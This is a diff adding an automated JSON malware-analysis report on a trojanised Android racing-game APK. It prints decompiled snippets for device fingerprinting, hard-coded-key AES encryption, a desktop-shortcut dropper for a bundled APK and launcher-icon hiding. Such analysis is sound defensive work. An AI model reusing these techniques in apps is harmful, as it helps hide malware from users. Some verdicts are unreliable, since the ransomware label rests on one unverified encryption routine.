@@ -1,0 +1,176 @@
+{
+  "APK信息": {
+    "文件名": "61142d609ecd3ecbe257afd6a639a87877642e4de0b8a4b899cff41a61cb5c9e.apk",
+    "sha256": "61142d609ecd3ecbe257afd6a639a87877642e4de0b8a4b899cff41a61cb5c9e",
+    "包名": "com.hillclimbrace",
+    "应用名": "Climb racing",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1116.4
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\ads\\b\\a;",
+          "method_signature": "if(c == null)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "String string = Settings.Secure.getString(context.getContentResolver(), \"android_id\");\nString strA = (string == null || c()) ? a(\"emulator\") : a(string);\nc = strA.toUpperCase(Locale.US);\nreturn c;",
+          "malicious_code_snippet_context": "  \n      public static String a(Context context) {\n          if (c == null) {\n>>>             String string = Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>             String strA = (string == null || c()) ? a(\"emulator\") : a(string);\n>>>             if (strA == null) {\n>>>                 return null;\n              }\n              c = strA.toUpperCase(Locale.US);\n          }",
+          "behavior_description": "该代码位于广告SDK（com.google.ads）工具类中，通过 Settings.Secure.getString 读取设备持久标识符 ANDROID_ID 作为数据来源，同时调用 c() 检测是否运行于模拟器环境（模拟器场景下以固定字符串 \"emulator\" 替代真实标识），随后对获取到的标识符进行哈希变换并转为大写，缓存到静态变量 c 中，从而生成跨会话稳定的设备指纹，用于设备识别与广告追踪。数据流向：ANDROID_ID（source）→ 模拟器检测/哈希处理 → 静态缓存生成设备指纹（sink，供SDK后续广告请求或设备追踪使用）。该片段本身未见向C2服务器外传等直接恶意操作，属于广告SDK隐蔽采集设备指纹的灰色行为，间接隐私风险有限。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\ads\\b\\a;",
+          "method_signature": "b(String str)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(1, new SecretKeySpec(new byte[]{10, 55, -112, -47, -6, 7, 11, 75, -7, -121, 121, 69, 80, -61, 15, 5}, \"AES\"));\nbyte[] iv = cipher.getIV();\nbyte[] bArrDoFinal = cipher.doFinal(str.getBytes());\nbyte[] bArr = new byte[iv.length + bArrDoFinal.length];\nSystem.arraycopy(iv, 0, bArr, 0, iv.length);\nSystem.arraycopy(bArrDoFinal, 0, bArr, iv.length, bArrDoFinal.length);\nreturn e.a(bArr);",
+          "malicious_code_snippet_context": "  \n      private static String b(String str) {\n          try {\n>>>             Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             cipher.init(1, new SecretKeySpec(new byte[]{10, 55, -112, -47, -6, 7, 11, 75, -7, -121, 121, 69, 80, -61, 15, 5}, \"AES\"));\n>>>             byte[] iv = cipher.getIV();\n>>>             byte[] bArrDoFinal = cipher.doFinal(str.getBytes());\n>>>             byte[] bArr = new byte[iv.length + bArrDoFinal.length];\n>>>             System.arraycopy(iv, 0, bArr, 0, iv.length);\n>>>             System.arraycopy(bArrDoFinal, 0, bArr, iv.length, bArrDoFinal.length);\n>>>             return e.a(bArr);\n          } catch (GeneralSecurityException e2) {\n              return null;\n          }",
+          "behavior_description": "该代码位于伪装成 Google Ads SDK 的类 com.google.ads.b.a 中（真实广告库中不存在此类结构，且与同类的屏幕宽度工具方法混杂，是典型的恶意代码注入/伪装手法）。方法使用硬编码的16字节AES密钥初始化 AES/CBC/PKCS5Padding 加密器（init模式1为加密），对传入字符串执行 cipher.doFinal(str.getBytes()) 加密，再将随机生成的IV与密文拼接后编码返回。数据流向：待加密数据（str，即被读取的文件内容/用户数据）→ 硬编码密钥AES加密 → 输出不可读密文。密钥完全由攻击者掌控，用户无法自行解密恢复，结合ESET确认的捆绑木马样本及已确认的勒索文件加密行为，该函数是文件加密勒索的核心加密原语，直接导致用户数据不可用并造成损失。 [未经交叉验证]",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\hillclimbrace\\e;",
+          "method_signature": "if(b(str2, false)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(new File(str)), \"application/vnd.android.package-archive\");\nIntent intent2 = new Intent();\nintent2.putExtra(\"android.intent.extra.shortcut.INTENT\", intent);\nintent2.putExtra(\"android.intent.extra.shortcut.NAME\", str2);\nintent2.putExtra(\"android.intent.extra.shortcut.ICON_RESOURCE\", Intent.ShortcutIconResource.fromContext(context, i));\nintent2.setAction(\"com.android.launcher.action.INSTALL_SHORTCUT\");\ncontext.sendBroadcast(intent2);",
+          "malicious_code_snippet_context": "              return;\n          }\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(new File(str)), \"application/vnd.android.package-archive\");\n>>>             Intent intent2 = new Intent();\n>>>             intent2.putExtra(\"android.intent.extra.shortcut.INTENT\", intent);\n>>>             intent2.putExtra(\"android.intent.extra.shortcut.NAME\", str2);\n>>>             intent2.putExtra(\"android.intent.extra.shortcut.ICON_RESOURCE\", Intent.ShortcutIconResource.fromContext(context, i));\n>>>             intent2.setAction(\"com.android.launcher.action.INSTALL_SHORTCUT\");\n>>>             context.sendBroadcast(intent2);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该方法接收APK文件路径(str)、图标资源ID(i)和快捷方式名称(str2)，构造指向该APK文件的VIEW Intent（MIME类型为application/vnd.android.package-archive，即Android安装包），再通过com.android.launcher.action.INSTALL_SHORTCUT广播在用户桌面静默创建快捷方式。数据流向：内置捆绑的APK文件路径 new File(str) → 指向APK安装的Intent → sendBroadcast()在桌面植入伪装快捷方式。结合ESET报告，该样本是捆绑投放型木马（捆绑名为systemdata/resourcea的恶意APK），此代码通过在桌面创建带伪装名称和图标的快捷方式，诱骗用户点击后调起系统安装器安装恶意负载，属于投放器(Dropper)诱导安装链路的关键环节。虽然实际安装仍需用户点击确认（非完全静默root安装），但该快捷方式植入行为是恶意负载传播的社会工程学手段。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\hillclimbrace\\e;",
+          "method_signature": "b(String str)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String b(String str) {\n    return String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + \"/\" + str;\n}",
+          "malicious_code_snippet_context": "          return new File(str).exists();\n      }\n  \n>>>     public static String b(String str) {\n>>>         return String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + \"/\" + str;\n>>>     }\n  \n      public static void b(Context context, String str) {\n          new Intent();",
+          "behavior_description": "该方法是木马样本（ESET 报告中捆绑 systemdata/resourcea 子包的 Hill Climb Racing 伪装游戏）中的文件路径辅助函数，将调用方传入的文件名与 Environment.getExternalStorageDirectory() 获取的外部存储根目录拼接，生成 SD 卡上的绝对路径（如 /sdcard/<文件名>）。结合同类中 a() 方法的 new File(str).exists() 存在性检查，以及同方法组中携带 remoteLauch 标志远程启动其他应用的 Intent 代码，该路径构造被木马用于定位/访问外部存储上的文件（如释放或查找捆绑的恶意子包 APK、访问用户 SD 卡文件）。数据流向：调用方传入的文件名参数 → getExternalStorageDirectory() 拼接 → 返回外部存储绝对路径 → 供后续 File.exists() 存在性检查及文件读写等文件访问操作使用。单独的路径构造不直接造成损害，属于木马文件访问链路的支撑环节，故风险定为中。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\hillclimbrace\\MainActivity;",
+          "method_signature": "if(e.b(\"fist_lauch_a\", true)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (e.b(\"fist_lauch_a\", true)) {\n    e.a(\"fist_lauch_a\", false);\n} else {\n    getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\n}",
+          "malicious_code_snippet_context": "          this.l = (TextView) findViewById(R.id.tv_thanks);\n          f();\n          f = this;\n>>>         if (e.b(\"fist_lauch_a\", true)) {\n>>>             e.a(\"fist_lauch_a\", false);\n>>>         } else {\n>>>             getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\n>>>         }\n          c();\n      }\n  ",
+          "behavior_description": "代码利用 SharedPreferences 标志位 \"fist_lauch_a\" 判断启动次数：首次启动时仅将标志写为 false，不执行任何异常操作以躲避初次检查；第二次启动时调用 setComponentEnabledSetting 将自身 Activity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失。数据流向为：读取本地 SharedPreferences 标志位（source）→ 通过 PackageManager 禁用自身组件以隐藏图标（sink）。图标隐藏后用户难以发现和卸载该应用，是木马隐蔽驻留的典型手法，与 ESET 报告中该样本（伪装游戏捆绑 systemdata/resourcea 的木马）的隐蔽攻击行为吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
